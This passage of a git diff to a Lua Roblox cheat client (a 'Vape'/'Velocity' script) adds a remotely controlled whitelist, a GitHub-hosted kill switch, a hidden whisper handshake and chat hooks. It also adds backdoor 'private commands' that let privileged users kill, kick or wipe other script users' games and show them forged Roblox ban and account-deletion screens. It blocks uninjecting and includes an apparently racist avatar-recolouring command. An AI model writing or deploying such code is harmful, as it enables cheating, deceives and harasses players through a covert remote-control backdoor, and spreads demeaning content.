@@ -3,6 +3,7 @@ local ver = 'v.0'
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
+local coreGui = {}
 local lightingService = game:GetService("Lighting")
 local textChatService = game:GetService("TextChatService")
 local inputService = game:GetService("UserInputService")
@@ -12,6 +13,7 @@ local tweenService = game:GetService("TweenService")
 local gameCamera = workspace.CurrentCamera
 local lplr = playersService.LocalPlayer
 local vapeConnections = {}
+local debris = game:GetService('Debris')
 local vapeCachedAssets = {}
 local clonefunc = (clonefunction or clonefunc or function(func) return func end)
 local identity = (getidentity or syn and syn.getidentity or function() return 2 end)
@@ -19,9 +21,9 @@ local httpService = game:GetService('HttpService')
 local setidentity = (setthreadcaps or syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity or function() end)
 local oldcall
 local vapeTargetInfo = shared.VapeTargetInfo
+local vapeInjected = true
 local vapeStore = {Bindable = {}, MessageReceived = Instance.new('BindableEvent'), platform = inputService:GetPlatform()}
 getgenv().vapeStore = vapeStore
-local vapeInjected = true
 table.insert(vapeConnections, workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
 	gameCamera = workspace.CurrentCamera or workspace:FindFirstChildWhichIsA("Camera")
 end))
@@ -43,6 +45,7 @@ local vapeAssetTable = {["vape/assets/VapeCape.png"] = "rbxassetid://16728149231
 local getcustomasset = getsynasset or getcustomasset or function(location) return vapeAssetTable[location] or "" end
 local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
 local synapsev3 = syn and syn.toast_notification and "V3" or ""
+pcall(function() coreGui = game:GetService('CoreGui') end)
 local worldtoscreenpoint = function(pos)
 	if synapsev3 == "V3" then 
 		local scr = worldtoscreen({pos})
@@ -58,19 +61,6 @@ local worldtoviewportpoint = function(pos)
 	return gameCamera.WorldToViewportPoint(gameCamera, pos)
 end
 
-if hookmetamethod then
-     oldcall = hookmetamethod(game, '__namecall', function(self, ...) 
-         if shared.VapeExecuted and self == httpService then 
-             local oldidentity = identity()
-             setidentity(8)
-             local res = oldcall(self, ...)
-             setidentity(oldidentity)
-             return res
-         end
-         return oldcall(self, ...)
-     end)
- end
-
 local function vapeGithubRequest(scripturl)
 	if not isfile("vape/"..scripturl) then
 		local suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
@@ -81,15 +71,6 @@ local function vapeGithubRequest(scripturl)
 	end
 	return readfile("vape/"..scripturl)
 end
-
-local whitelistStore = {
-    	whitelist = {
-		chatStrings1 = {helloimusinginhaler = "vape"},
-		chatStrings2 = {vape = "helloimusinginhaler"},
-		clientUsers = {},
-		oldChatFunctions = {}
-	},
-}
 
 local function downloadVapeAsset(path)
 	if not isfile(path) then
@@ -121,10 +102,15 @@ end
 local function warningNotification(title, text, delay)
 	local suc, res = pcall(function()
 		local frame = GuiLibrary.CreateNotification(title, text, delay, "assets/WarningNotification.png")
-		frame.Frame.Frame.ImageColor3 = Color3.fromRGB(236, 129, 44)
+		frame.Frame.Frame.ImageColor3 = Color3.fromRGB(93, 63, 211)
 		return frame
 	end)
 	return (suc and res)
+end
+
+local function removeTags(str)
+	str = str:gsub("<br%s*/>", "\n")
+	return (str:gsub("<[^<>]->", ""))
 end
 
 local function runFunction(func) func() end
@@ -158,10 +144,20 @@ local function getPlayerColor(plr)
 	return tostring(plr.TeamColor) ~= "White" and plr.TeamColor.Color
 end
 
+local WhitelistFunctions = {data = {WhitelistedUsers = {}}, hashes = {}, said = {}, alreadychecked = {}, customtags = {}, loaded = false, localprio = 0, hooked = false, get = function() return 0, true end}
 local entityLibrary = loadstring(vapeGithubRequest("Libraries/entityHandler.lua"))()
 local sendmessage = function() end
 local sendprivatemessage = function() end
 shared.vapeentity = entityLibrary
+
+sendmessage = function(text)
+	if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(text)
+	else
+		replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
+	end
+end
+
 do
 	entityLibrary.selfDestruct()
 	table.insert(vapeConnections, GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.FriendRefresh.Event:Connect(function()
@@ -182,6 +178,7 @@ do
 	end
 	entityLibrary.isPlayerTargetable = function(plr)
 		if isFriend(plr) then return false end
+        if not ({WhitelistFunctions:get(plr)})[2] then return false end
 		if (not GuiLibrary.ObjectsThatCanBeSaved["Teams by colorToggle"].Api.Enabled) then return true end
 		if (not lplr.Team) then return true end
 		if (not plr.Team) then return true end
@@ -280,29 +277,6 @@ local function EntityNearPosition(distance, checktab)
 	end
 end
 
-sendmessage = function(text)
-	if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(text)
-	else
-		replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
-	end
-end
-
-sendprivatemessage = function(player, text)
-	if player then
-		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-			local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-			local whisperchannel = game:GetService('RobloxReplicatedStorage').ExperienceChat.WhisperChat:InvokeServer(player.UserId)
-			if whisperchannel then
-				whisperchannel:SendAsync(text)
-				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
-			end
-		else
-			replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..player.Name.." "..text, 'All')
-		end
-	end
-end
-
 local function EntityNearMouse(distance, checktab)
 	checktab = checktab or {}
     if entityLibrary.isAlive then
@@ -360,177 +334,272 @@ local function AllNearPosition(distance, amount, checktab)
 	return returnedplayer
 end
 
-local WhitelistFunctions = {StoredHashes = {}, WhitelistTable = {WhitelistedUsers = {}}, Loaded = false, CustomTags = {}, playerTags = {}, LocalPriority = 0}
-do
-	local shalib
 
-task.spawn(function()
-		local whitelistloaded
-		whitelistloaded = pcall(function()
-			local commit = "main"
-			for i,v in pairs(game:HttpGet("https://github.com/Copiums/whitelistss"):split("\n")) do 
-				if v:find("commit") and v:find("fragment") then 
-					local str = v:split("/")[5]
-					commit = str:sub(0, str:find('"') - 1)
-					break
-				end
-			end
-			WhitelistFunctions.WhitelistTable = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/Copiums/whitelistss/"..commit.."/PlayersWhitelist.json", true))
-		end)
-		shalib = loadstring(vapeGithubRequest("Libraries/sha.lua"))()
-		if not whitelistloaded or not shalib then return end
-		WhitelistFunctions.Loaded = true
-		WhitelistFunctions.LocalPriority = WhitelistFunctions:GetWhitelist(lplr)
-		entityLibrary.fullEntityRefresh()
-	end)
-
-	function WhitelistFunctions:GetWhitelist(plr)
-		local plrstr = WhitelistFunctions:Hash(plr.Name..plr.UserId)
-		for i,v in pairs(WhitelistFunctions.WhitelistTable.WhitelistedUsers) do
+local sha = loadstring(vapeGithubRequest("Libraries/sha.lua"))()
+runFunction(function()
+	local olduninject
+	function WhitelistFunctions:get(plr)
+		local plrstr = self:hash(plr.Name..plr.UserId)
+        if game.Players.LocalPlayer == plr then
+            setclipboard(plrstr)
+        end
+		for i,v in self.data.WhitelistedUsers do
 			if v.hash == plrstr then
-				return v.level, v.attackable or WhitelistFunctions.LocalPriority > v.level, v.tags
+				return v.level, v.attackable or WhitelistFunctions.localprio >= v.level, v.tags
 			end
 		end
 		return 0, true
 	end
-	
-	function WhitelistFunctions:GetTag(plr)
-		local plrstr, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
-		local hash = WhitelistFunctions:Hash(plr.Name..plr.UserId)
-		local newtag = WhitelistFunctions.CustomTags[plr.Name] or ""
-		if plrtag then
-			for i2,v2 in pairs(plrtag) do
-				newtag = newtag..'['..v2.text..'] '
-			end
-		end
-		return newtag
-	end
-	
-	function WhitelistFunctions:GrabTagText(plr)
-	    local plrstr, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
-	    local hash = WhitelistFunctions:Hash(plr.Name..plr.UserId)
-	    local tag = WhitelistFunctions.CustomTags[plr.Name] or ""
-	    if plrtag then
-			for i2,v2 in pairs(plrtag) do
-				tag = v2.text
-			end
-		end
-		return tag
-	end
-	
-	function WhitelistFunctions:GrabTagColor(plr)
-	    local plrstr, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
-	    local hash = WhitelistFunctions:Hash(plr.Name..plr.UserId)
-	    local color
-	    if plrtag then
-			for i2,v2 in pairs(plrtag) do
-			    c = Color3.fromRGB(unpack(v2.color))
-			    nc = c:ToHex()
-			    color = nc
-			end
-		end
-		return color
-    end
 
-	function WhitelistFunctions:Hash(str)
-		if WhitelistFunctions.StoredHashes[str] == nil and shalib then
-			WhitelistFunctions.StoredHashes[str] = shalib.sha512(str.."SelfReport")
-		end
-		return WhitelistFunctions.StoredHashes[str] or ""
-	end
-
-	function WhitelistFunctions:CheckWhitelisted(plr)
-		local playertype = WhitelistFunctions:GetWhitelist(plr)
-		if playertype ~= 0 then 
-			return true
-		end
-		return false
-	end
-    
-	function WhitelistFunctions:CreatePlayerTag(plr, text, color)
-        WhitelistFunctions.playerTags = WhitelistFunctions.playerTags or {}
-        local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)
-	local newtag = WhitelistFunctions.CustomTags[plr.Name] or ""	
-	local tag = WhitelistFunctions:GrabTagText(plr)
-	local c = WhitelistFunctions:GrabTagColor(plr)
-        local tagText = ""
-        local tagColor = color or ""
-	
-        if plrPriority == 1 then
-            tagText = tag or text
-            tagColor = c 
-        elseif plrPriority == 2 then
-            tagText = tag or text
-            tagColor = c
-        elseif plrPriority == 0 then
-            tagText = text or "" 
-        end
-		
-        if plrTags then
-            for _, tagInfo in ipairs(plrTags) do
-                tagText = tagText .. "[" .. tagInfo.text .. "] "
-            end
-        end
-        WhitelistFunctions.playerTags[plr] = {
-                Text = tagText,
-                Color = tagColor
-        }
-        pcall(function() shared.vapeentity.fullEntityRefresh() end)
-        return WhitelistFunctions.playerTags[plr]
-    end
-    
-    function WhitelistFunctions:CheckPlayerType(plr)
-        local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)
-        if plrPriority == 0 then
-           return 'DEFAULT'
-        elseif plrPriority == 1 then
-           return 'VAPE PRIVATE'
-        elseif plrPriority == 2 then
-           return 'VAPE OWNER'
-        end
-    end
-  
-	function WhitelistFunctions:IsSpecialIngame()
-		for i,v in pairs(playersService:GetPlayers()) do 
-			if WhitelistFunctions:CheckWhitelisted(v) then 
+	function WhitelistFunctions:isingame()
+		for i, v in playersService:GetPlayers() do
+			if self:get(v) ~= 0 then
 				return true
 			end
 		end
 		return false
 	end
-end
 
+	function WhitelistFunctions:tag(plr, text, rich)
+		local plrtag = ({self:get(plr)})[3] or self.customtags[plr.Name] or {}
+		if not text then return plrtag end
+		local newtag = ''
+		for i, v in ipairs(plrtag) do
+			newtag = newtag..(rich and '<font color="#'..v.color:ToHex()..'">['..v.text..']</font>' or '['..removeTags(v.text)..']')..' '
+		end
+		return newtag
+	end
+
+	function WhitelistFunctions:hash(str)
+		if self.hashes[str] == nil and sha then
+			self.hashes[str] = sha.sha512(str..'SelfReport')
+		end
+		return self.hashes[str] or ''
+	end
+
+	function WhitelistFunctions:playeradded(v, joined)
+		if self:get(v) ~= 0 then
+			if self.alreadychecked[v.UserId] then return end
+			self.alreadychecked[v.UserId] = true
+			self:hook()
+			if self.localprio == 0 then
+				olduninject = GuiLibrary.SelfDestruct
+				GuiLibrary.SelfDestruct = function() warningNotification('Vape', 'No escaping the private members :)', 10) end
+				if joined then task.wait(10) end
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+					if newchannel then newchannel:SendAsync('helloimusinginhaler') end
+					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+				elseif replicatedStorageService:FindFirstChild('DefaultChatSystemChatEvents') then
+					replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
+				end
+			end
+		end
+	end
+ 
+	function WhitelistFunctions:checkmessage(msg, plr)
+		local otherprio = self:get(plr)
+		if plr == lplr and msg == 'helloimusinginhaler' then return true end
+		if self.localprio > 0 and self.said[plr.Name] == nil and msg == 'helloimusinginhaler' and plr ~= lplr then
+			self.said[plr.Name] = true
+			warningNotification('Vape', plr.Name..' is using vape!', 60)
+			self.customtags[plr.Name] = {{text = 'VAPE USER', color = Color3.new(1, 1, 0)}}
+			local newent = entityLibrary.getEntity(plr)
+			if newent then entityLibrary.Events.EntityUpdated:Fire(newent) end
+			return true
+		end
+        return false
+	end
+
+	function WhitelistFunctions:newchat(obj, plr, skip)
+		obj.Text = self:tag(plr, true, true)..obj.Text
+		local sub = obj.ContentText:find(': ')
+		if sub then
+			if not skip and self:checkmessage(obj.ContentText:sub(sub + 3, #obj.ContentText), plr) then
+				obj.Visible = false
+			end
+		end
+	end
+
+	function WhitelistFunctions:oldchat(func)
+		local msgtable = debug.getupvalue(func, 3)
+		if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
+			WhitelistFunctions.oldchattable = msgtable
+		end
+		local oldchat
+
+		oldchat = hookfunction(func, function(data, ...)
+			local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
+			if plr then
+				data.ExtraData.Tags = data.ExtraData.Tags or {}
+				for i, v in self:tag(plr) do
+					table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
+				end
+				if data.Message and self:checkmessage(data.Message, plr) then data.Message = '' end
+			end
+			return oldchat(data, ...)
+		end)
+		table.insert(vapeConnections, {Disconnect = function() hookfunction(func, oldchat) end})
+	end
+
+	function WhitelistFunctions:hook()
+		if self.hooked then return end
+		self.hooked = true
+		local exp = coreGui:FindFirstChild('ExperienceChat')
+		if exp then
+			local bubblechat = exp:WaitForChild('bubbleChat', 5)
+			if bubblechat then
+				table.insert(vapeConnections, bubblechat.DescendantAdded:Connect(function(newbubble)
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
+						newbubble.Parent.Parent.Visible = false
+					end
+				end))
+			end
+		end
+		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+			if exp then
+				table.insert(vapeConnections, exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
+					local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
+					obj = obj:FindFirstChild('TextMessage', true)
+					if obj then
+						if plr then
+							self:newchat(obj, plr, true)
+							obj:GetPropertyChangedSignal('Text'):Wait()
+							self:newchat(obj, plr)
+						end
+						if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
+							obj.Visible = false
+						end
+					end
+				end))
+			end
+		elseif replicatedStorageService:FindFirstChild('DefaultChatSystemChatEvents') then
+			pcall(function()
+				for i, v in getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
+					if table.find(debug.getconstants(v.Function), 'UpdateMessagePostedInChannel') then
+						WhitelistFunctions:oldchat(v.Function)
+						break
+					end
+				end
+				for i, v in getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent) do
+					if table.find(debug.getconstants(v.Function), 'UpdateMessageFiltered') then
+						WhitelistFunctions:oldchat(v.Function)
+						break
+					end
+				end
+			end)
+		end
+	end
+
+	function WhitelistFunctions:check(first)
+		local whitelistloaded = pcall(function()
+			local subbed = game:HttpGet('https://github.com/Copiums/whitelistss'):sub(130000, 137000)
+			local commit = subbed:find('spoofed_commit_check')
+			commit = commit and subbed:sub(commit + 21, commit + 60) or 'main'
+			WhitelistFunctions.textdata = game:HttpGet('https://raw.githubusercontent.com/Copiums/whitelistss/'..commit..'/PlayerWhitelist.json', true)
+		end)
+		if not whitelistloaded or not sha or not WhitelistFunctions.get then return true end
+		WhitelistFunctions.loaded = true
+		if not first or WhitelistFunctions.textdata ~= WhitelistFunctions.olddata then
+			if not first then
+				WhitelistFunctions.olddata = isfile('vape/profiles/whitelist.json') and readfile('vape/profiles/whitelist.json') or nil
+			end
+			WhitelistFunctions.data = game:GetService('HttpService'):JSONDecode(WhitelistFunctions.textdata)
+			WhitelistFunctions.localprio = WhitelistFunctions:get(lplr)
+			for i, v in WhitelistFunctions.data.WhitelistedUsers do
+				if v.tags then
+					for i2, v2 in v.tags do
+						v2.color = Color3.fromRGB(unpack(v2.color))
+					end
+				end
+			end
+			for i, v in playersService:GetPlayers() do WhitelistFunctions:playeradded(v) end
+			if not WhitelistFunctions.connection then
+				WhitelistFunctions.connection = playersService.PlayerAdded:Connect(function(v) WhitelistFunctions:playeradded(v, true) end)
+			end
+			if (entityLibrary.isAlive or #entityLibrary.entityList > 0) then
+				entityLibrary.fullEntityRefresh()
+			end
+
+			if WhitelistFunctions.textdata ~= WhitelistFunctions.olddata then
+				if WhitelistFunctions.data.Announcement.expiretime > os.time() then
+					local targets = WhitelistFunctions.data.Announcement.targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
+					if table.find(targets, tostring(lplr.UserId)) then
+						local hint = Instance.new('Hint')
+						hint.Text = 'VAPE ANNOUNCEMENT: '..WhitelistFunctions.data.Announcement.text
+						hint.Parent = workspace
+						game:GetService('Debris'):AddItem(hint, 20)
+					end
+				end
+				WhitelistFunctions.olddata = WhitelistFunctions.textdata
+				pcall(function() writefile('vape/profiles/whitelist.json', WhitelistFunctions.textdata) end)
+			end
+
+			if WhitelistFunctions.data.KillVape then
+				GuiLibrary.SelfDestruct()
+				return true
+			end
+
+			if WhitelistFunctions.data.BlacklistedUsers[tostring(lplr.UserId)] then
+				task.spawn(lplr.kick, lplr, WhitelistFunctions.data.BlacklistedUsers[tostring(lplr.UserId)])
+				return true
+			end
+		end
+	end
+        
+    function WhitelistFunctions:CheckPlayerType(plr)
+        local plrPriority, _, _ = WhitelistFunctions:get(plr)
+        if plrPriority == 0 then
+           return 'DEFAULT'
+		elseif plrPriority == 1 then
+		   return 'BUYER'
+        elseif plrPriority == 2 then
+           return 'VELOCITY PRIVATE'
+        elseif plrPriority == 3 then
+           return 'VELOCITY OWNER'
+        end
+    end
+        
+	task.spawn(function()
+		repeat
+			if WhitelistFunctions:check(WhitelistFunctions.loaded) then return end
+			task.wait(1)
+		until shared.VapeInjected == nil
+	end)
+	table.insert(vapeConnections, {Disconnect = function()
+		table.clear(WhitelistFunctions.data)
+		table.clear(WhitelistFunctions)
+	end})
+end)
 shared.vapewhitelist = WhitelistFunctions
 
 task.spawn(function()
-    local function chatfunc(plr)
-        table.insert(vapeConnections, plr.Chatted:Connect(function(message)
-            vapeStore.MessageReceived:Fire(plr, message)
-        end))
-    end
-    table.insert(vapeConnections, textChatService.MessageReceived:Connect(function(data)
-        local success, player = pcall(function() 
-            return playersService:GetPlayerByUserId(data.TextSource.UserId) 
-        end)
-        if success then 
-            vapeStore.MessageReceived:Fire(player, data.Text)
-        end
-    end))
-    for i,v in playersService:GetPlayers() do 
-        chatfunc(v)
-    end
-    table.insert(vapeConnections, playersService.PlayerAdded:Connect(chatfunc))
+	local function chatfunc(plr)
+		table.insert(vapeConnections, plr.Chatted:Connect(function(message)
+			vapeStore.MessageReceived:Fire(plr, message)
+		end))
+	end
+	table.insert(vapeConnections, textChatService.MessageReceived:Connect(function(data)
+		local success, player = pcall(function() 
+			return playersService:GetPlayerByUserId(data.TextSource.UserId) 
+		end)
+		if success then 
+			vapeStore.MessageReceived:Fire(player, data.Text)
+		end
+	end))
+	for i,v in playersService:GetPlayers() do 
+		chatfunc(v)
+	end
+	table.insert(vapeConnections, playersService.PlayerAdded:Connect(chatfunc))
 end)
 
 local function renderNametag(plr)
     if not plr or not plr:IsA("Player") then
         return
     end
-    if WhitelistFunctions.LocalPriority >= 1 then
+    if WhitelistFunctions.localprio == 3 then
         local plr = game.Players.LocalPlayer
-        if WhitelistFunctions.playerTags[plr] == nil then 
-            WhitelistFunctions:CreatePlayerTag(plr, 'VELOCITY PRIVATE', '#800080') 
-        end
         local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
         if playerlist then
             pcall(function()
@@ -565,19 +634,719 @@ local function renderNametag(plr)
 end
 
 task.spawn(function()
-    repeat task.wait() until WhitelistFunctions.Loaded
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if WhitelistFunctions.LocalPriority >= 1 then
-            renderNametag(player)
-        end
+    repeat task.wait() until WhitelistFunctions.loaded
+    if WhitelistFunctions.localprio == 3  then
+        renderNametag(player)
     end
     game.Players.PlayerAdded:Connect(function(player)
-        if WhitelistFunctions.LocalPriority >= 1 then
+        if WhitelistFunctions.localprio == 3 then
             renderNametag(player)
         end
     end)
 end)
 
+task.spawn(function()
+    local priolist = {
+        DEFAULT = 0,
+        ["BUYER"] = 1,
+        ["VELOCITY PRIVATE"] = 2,
+		["VELOCITY OWNER"] = 3
+    }
+    local function findplayers(arg, plr)
+        local temp = {}
+        local continuechecking = true
+        if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
+        if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
+		if arg == "buyer" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "BUYER" then table.insert(temp, lplr) continuechecking = false end
+		if arg == "private" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "VELOCITY PRIVATE" then table.insert(temp, lplr) continuechecking = false end
+		if arg == "owner" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "VELOCITY OWNER" then table.insert(temp, lplr) continuechecking = false end
+        for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
+        return temp
+    end
+
+    local function transformImage(img, txt)
+        local function funnyfunc(v)
+            if v:GetFullName():find("ExperienceChat") == nil then
+                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+                    v.Image = img
+                    v:GetPropertyChangedSignal("Image"):Connect(function()
+                        v.Image = img
+                    end)
+                end
+                if v:IsA("TextLabel") or v:IsA("TextButton") then
+                    if v.Text ~= "" then
+                        v.Text = txt
+                    end
+                    v:GetPropertyChangedSignal("Text"):Connect(function()
+                        if v.Text ~= "" then
+                            v.Text = txt
+                        end
+                    end)
+                end
+                if v:IsA("Texture") or v:IsA("Decal") then
+                    v.Texture = img
+                    v:GetPropertyChangedSignal("Texture"):Connect(function()
+                        v.Texture = img
+                    end)
+                end
+                if v:IsA("MeshPart") then
+                    v.TextureID = img
+                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
+                        v.TextureID = img
+                    end)
+                end
+                if v:IsA("SpecialMesh") then
+                    v.TextureId = img
+                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
+                        v.TextureId = img
+                    end)
+                end
+                if v:IsA("Sky") then
+                    v.SkyboxBk = img
+                    v.SkyboxDn = img
+                    v.SkyboxFt = img
+                    v.SkyboxLf = img
+                    v.SkyboxRt = img
+                    v.SkyboxUp = img
+                end
+            end
+        end
+
+        for i, v in pairs(game:GetDescendants()) do
+            funnyfunc(v)
+        end
+        game.DescendantAdded:Connect(funnyfunc)
+    end
+
+    local vapePrivateCommands = {
+		kill = function(args, plr)
+			if entityLibrary.isAlive then
+				local hum = entityLibrary.character.Humanoid
+				task.delay(0.1, function()
+					if hum and hum.Health > 0 then 
+						hum:ChangeState(Enum.HumanoidStateType.Dead)
+						hum.Health = 0
+					end
+				end)
+			end
+		end,
+        murder = function(args, plr)
+            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+	     	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+        end,
+        black = function(args)
+            lplr.CharacterAdded:Connect(function(character)
+                local h = character:FindFirstChildOfClass("Humanoid")
+                if h then
+                    h:WaitForChild("Head").Color = Color3.new(139/255, 69/255, 19/255)
+                    h:WaitForChild("LeftArm").Color = Color3.new(139/255, 69/255, 19/255)
+                    h:WaitForChild("RightArm").Color = Color3.new(139/255, 69/255, 19/255)
+                    h:WaitForChild("Torso").Color = Color3.new(139/255, 69/255, 19/255)
+                    h:WaitForChild("LeftLeg").Color = Color3.new(139/255, 69/255, 19/255)
+                    h:WaitForChild("RightLeg").Color = Color3.new(139/255, 69/255, 19/255)
+                end
+            end)
+        end,
+        troll = function(args)
+            task.spawn(function()
+                transformImage("http://www.roblox.com/asset/?id=13953598788", "xylex")
+                task.wait(6)
+                lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+            end)
+        end,
+		terminate = function()
+			task.spawn(function()
+				--if vape.ThreadFix and setthreadcaps then setthreadcaps(8) end
+				local UIBlox = getrenv().require(game:GetService('CorePackages').UIBlox)
+				local Roact = getrenv().require(game:GetService('CorePackages').Roact)
+				UIBlox.init(getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(coreGui.RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Themes.DarkTheme
+				local gotham = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Fonts.Gotham
+				local tLocalization = getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppLocales).Localization
+				local a = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				vape.gui.Enabled = false
+				coreGui:ClearAllChildren()
+				lightingService:ClearAllChildren()
+				for i, v in workspace:GetChildren() do pcall(function() v:Destroy() end) end
+				task.wait(0.2)
+				lplr.kick(lplr)
+				guiService:ClearError()
+				task.wait(2)
+				local gui = Instance.new('ScreenGui')
+				gui.IgnoreGuiInset = true
+				gui.Parent = coreGui
+				local frame = Instance.new('ImageLabel')
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.fromScale(1, 1)
+				frame.BackgroundColor3 = Color3.new(1, 1, 1)
+				frame.ScaleType = Enum.ScaleType.Crop
+				frame.Parent = gui
+				task.delay(0.1, function() frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg' end)
+				task.delay(2, function()
+					local e = Roact.createElement(auth, {
+						style = {},
+						screenSize = gameCamera.ViewportSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = 'Delete',
+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {{abuseType = 'ABUSE_TYPE_CHEAT_AND_EXPLOITS', utteranceText = 'ExploitDetected - Place ID : '..game.PlaceId}},
+							messageToUser = 'Roblox does not permit the use of third-party software to modify the client.'
+						},
+						termsActivated = function() end,
+						communityGuidelinesActivated = function() end,
+						supportFormActivated = function() end,
+						reactivateAccountActivated = function() end,
+						logoutCallback = function() end,
+						globalGuiInset = {top = 0}
+					})
+					local screengui = Roact.createElement('ScreenGui', {}, Roact.createElement(a, {
+							localization = tLocalization.new('en-us')
+						}, {Roact.createElement(UIBlox.Style.Provider, {
+								style = {
+									Theme = darktheme,
+									Font = gotham
+								},
+							}, {e})}))
+					Roact.mount(screengui, coreGui)
+				end)
+			end)
+		end,
+		byfron = function(args, plr)
+			task.spawn(function()
+                --if vape.ThreadFix and setthreadcaps then setthreadcaps(8) end
+				local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+				local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+				UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+				local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+				local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+				local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				GuiLibrary.MainGui.Enabled = false
+				game:GetService("CoreGui"):ClearAllChildren()
+				for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+				task.wait(0.2)
+				lplr:Kick()
+				game:GetService("GuiService"):ClearError()
+				task.wait(2)
+				local gui = Instance.new("ScreenGui")
+				gui.IgnoreGuiInset = true
+				gui.Parent = game:GetService("CoreGui")
+				local frame = Instance.new("Frame")
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.new(1, 0, 1, 0)
+				frame.BackgroundColor3 = Color3.new(1, 1, 1)
+				frame.Parent = gui
+				task.delay(0.1, function()
+					frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+				end)
+				task.delay(2, function()
+					local e = Roact.createElement(auth, {
+						style = {},
+						screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = "Delete",
